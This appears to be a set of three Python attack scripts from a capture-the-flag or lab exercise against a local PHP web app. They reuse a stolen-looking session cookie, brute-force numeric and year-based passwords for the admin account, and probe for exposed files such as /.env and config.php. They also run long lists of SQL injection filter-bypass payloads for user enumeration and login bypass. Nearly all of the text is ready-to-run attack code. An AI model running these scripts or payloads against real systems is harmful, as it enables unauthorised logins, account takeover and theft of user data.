#!/usr/bin/env python3
"""
Check if existing session cookie is valid, and test alternate auth methods
"""
import requests

login_url = "http://127.0.0.1:8080/login.php"
index_url = "http://127.0.0.1:8080/index.php"

# Session cookie from previous tasks
session_cookie = {"PHPSESSID": "adf118a2717e83ee6455ea878ebb507e"}

print("=" * 80)
print("TESTING EXISTING SESSION COOKIE")
print("=" * 80)

# Test if the session cookie gives us access
response = requests.get(index_url, cookies=session_cookie, timeout=10)
print(f"[INDEX] With session cookie:")
print(f"  Status: {response.status_code}")
print(f"  Response:\n{response.text[:1000]}")
print()

response = requests.get(login_url, cookies=session_cookie, timeout=10)
print(f"[LOGIN] With session cookie:")
print(f"  Status: {response.status_code}")
print(f"  Response:\n{response.text[:1000]}")
print()

# Try fuzzing a simple numeric password for admin
print("=" * 80)
print("FUZZING NUMERIC PASSWORDS FOR 'admin'")
print("=" * 80)

found = False
for i in range(1000, 10000):  # Try 4-digit passwords
    data = {"username": "admin", "password": str(i)}
    response = requests.post(login_url, data=data, timeout=10, allow_redirects=True)
    
    if "Error!" not in response.text:
        print(f"[SUCCESS] Password found: {i}")
        print(f"  Response: {response.text[:500]}")
        found = True
        break
    
    if i % 100 == 0:
        print(f"  Tested up to password: {i}")

if not found:
    print("No numeric password found in range 1000-9999")

# Also try common year passwords
print("=" * 80)
print("TESTING YEAR-BASED PASSWORDS")
print("=" * 80)

year_passwords = [str(y) for y in range(1990, 2025)] + \
                 [f"admin{y}" for y in range(1990, 2025)] + \
                 [f"{y}admin" for y in range(1990, 2025)]

for password in year_passwords:
    data = {"username": "admin", "password": password}
    response = requests.post(login_url, data=data, timeout=10, allow_redirects=True)
    
    if "Error!" not in response.text:
        print(f"[SUCCESS] Password found: {password}")
        print(f"  Response: {response.text[:500]}")
        break
#!/usr/bin/env python3
"""
Explore the search.php endpoint more thoroughly
Look for information disclosure and test with different inputs
"""
import requests
import re

search_url = "http://127.0.0.1:8080/search.php"
login_url = "http://127.0.0.1:8080/login.php"
index_url = "http://127.0.0.1:8080/index.php"

print("=" * 80)
print("EXAMINING SEARCH.PHP WITH VARIOUS INPUTS")
print("=" * 80)

# First, get the search form
response = requests.get(search_url, timeout=10)
print(f"[GET search.php] Status: {response.status_code}")
print(f"[GET search.php] Response:\n{response.text}")
print("-" * 60)

# Test search with various patterns
test_inputs = [
    "admin",
    "a%",  # wildcard
    "",    # empty
    "'",   # single quote
    "' OR '1'='1",  # SQLi test
    "%",   # percent
    "*",   # asterisk
    "_",   # underscore  
    "admin'--",  # comment injection
    "1", "2", "3",  # numeric
]

for inp in test_inputs:
    data = {"username": inp}
    response = requests.post(search_url, data=data, timeout=10)
    print(f"[POST username='{inp}'] Status: {response.status_code}")
    print(f"  Response: {response.text}")
    print()

# Check if there's a registration endpoint
print("=" * 80)
print("CHECKING FOR ADDITIONAL ENDPOINTS")
print("=" * 80)

endpoints = [
    "/register.php",
    "/signup.php", 
    "/create.php",
    "/add.php",
    "/users.php",
    "/list.php",
    "/admin.php",
    "/config.php",
    "/robots.txt",
    "/.env"
]

base_url = "http://127.0.0.1:8080"
for endpoint in endpoints:
    url = base_url + endpoint
    response = requests.get(url, timeout=10)
    if response.status_code != 404:
        print(f"[{endpoint}] Status: {response.status_code}")
        print(f"  Response preview: {response.text[:300]}")
        print()
#!/usr/bin/env python3
"""
Try bypassing the SQL filter using various encodings
Also enumerate more users with different techniques
"""
import requests
import urllib.parse

search_url = "http://127.0.0.1:8080/search.php"
login_url = "http://127.0.0.1:8080/login.php"

print("=" * 80)
print("SEARCH FOR USERS - SQL INJECTION BYPASS ATTEMPTS")
print("=" * 80)

# Try bypassing filter with different encodings
sqli_bypasses = [
    "' OR '1'='1",
    "'||'1'=='1",  # Oracle style
    "'+OR+'1'='1",  # URL space encoding might bypass
    "'%20OR%20'1'='1",  # Already encoded
    "'/**/OR/**/'1'='1",  # Comment as whitespace
    "'+OR+'1'='1",  # Plus as space
    "%27%20OR%20%271%27=%271",  # Full URL encoding
    "'+or+1=1--",  
    "'+or+1=1#", 
    "'+or+'1'='1",
    "' or 1=1 --",
    "' or 1=1#",
    "' || '1'='1",
    "'+||+'1'='1",
    "' /*!50000OR*/ '1'='1",  # MySQL comment
    "' /*!50000OR*/ 1=1--",
    "admin'+AND+1=1#",
    "admin'+AND+1=0#",
    "'%2527%2520OR%2520%25271%2527%3D%25271",  # Double URL encode
]

users_found = set()

for payload in sqli_bypasses:
    data = {"username": payload}
    response = requests.post(search_url, data=data, timeout=10)
    
    if "User exists" in response.text:
        # Extract username if present
        import re
        match = re.search(r'User exists:\s*(\S+)', response.text)
        if match:
            users_found.add(match.group(1))
            print(f"[FOUND USER with '{payload[:30]}...'] {match.group(1)}")
    elif "No results" in response.text:
        pass  # No user found
    else:
        # Check for errors or unusual responses
        if "filtered" in response.text.lower():
            print(f"[FILTERED] {payload[:40]}...")
        elif len(response.text) < 500:
            print(f"[UNUSUAL] '{payload[:40]}...' Response: {response.text[:200]}")

print("\n" + "=" * 80)
print("USERS DISCOVERED:")
print("=" * 80)
for user in users_found:
    print(f"  - {user}")

# Now try encoded SQLi in login form
print("\n" + "=" * 80)
print("ENCODED SQL INJECTION LOGIN BYPASS")
print("=" * 80)

encoded_payloads = [
    # URL encoded
    {"username": "%27%20OR%20%271%27=%271", "password": "x"},
    {"username": "%27||%271%27=%271", "password": "x"},
    {"username": "admin%27--", "password": "x"},
    {"username": "admin%27%23", "password": "x"},
    
    # Double URL encoded
    {"username": "%2527%2520OR%2520%25271%2527=%25271", "password": "x"},
    
    # Comment variations  
    {"username": "'/**/OR/**/'1'='1", "password": "x"},
    {"username": "'/**/OR/**/1=1--", "password": "x"},
    
    # Alternative quotes
    {"username": "\x27 OR \x271\x27=\x271", "password": "x"},
    
    # Null byte injection
    {"username": "%00' OR '1'='1", "password": "x"},
    
    # Mixed case
    {"username": "' Or '1'='1", "password": "x"},
    {"username": "' oR '1'='1", "password": "x"},
    
    # Newline injection
    {"username": "\n' OR '1'='1", "password": "x"},
    
    # Tab injection
    {"username": "\t' OR '1'='1", "password": "x"},
]

for payload in encoded_payloads:
    response = requests.post(login_url, data=payload, timeout=10, allow_redirects=True)
    
    if "Error!" not in response.text:
        print(f"[LOGIN BYPASS] Username: {payload['username'][:40]}")
        print(f"  Response preview: {response.text[:300]}")
        print()

print("=" * 80)
print("Testing complete")
print("=" * 80)
